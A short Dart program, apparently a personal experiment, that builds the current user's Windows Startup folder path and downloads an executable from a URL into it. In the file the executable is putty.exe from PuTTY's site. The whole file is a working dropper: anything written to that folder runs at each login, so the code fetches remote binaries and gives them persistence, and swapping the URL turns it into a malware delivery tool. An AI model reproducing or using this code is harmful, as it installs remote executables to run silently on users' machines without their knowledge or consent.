// ignore_for_file: non_constant_identifier_names, unused_local_variable, unnecessary_new
import 'dart:io';

import '../bin/fonctions/functions_path.dart';
import 'package:http/http.dart' as http;

// # C:\Users\niwrad\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
void main() {
  var chemin = pathOrigine();
  List chemin_recomposer = [];
  List chemin_liste = chemin.split(r'\');
  var lettre = recuperer_letter(chemin);
  chemin_liste[0] = lettre + ':';
  print(chemin_liste);

  String chemin_str = chemin_liste.toString().replaceAll(',', r'\');
  var chemin_path = chemin_str
      .replaceAll(' ', '')
      .replaceAll('[', '')
      .replaceAll(']', '')
      .replaceAll("'", '');

  print(chemin_path);
  String chemin_path_stable = chemin_liste[0] +
      r'\' +
      chemin_liste[1] +
      r'\' +
      chemin_liste[2] +
      r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\';
  print(chemin_path_stable);

  Future _downloadFile(String url, String filename) async {
    http.Client client = new http.Client();
    var req = await client.get(Uri.parse(url));
    var bytes = req.bodyBytes;
    String dir = chemin_path_stable;
    String dir_operation = dir + filename;
    File file = new File(dir_operation);
    await file.writeAsBytes(bytes);
    return file;
  }

  _downloadFile(
      'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe', 'putty.exe');
}
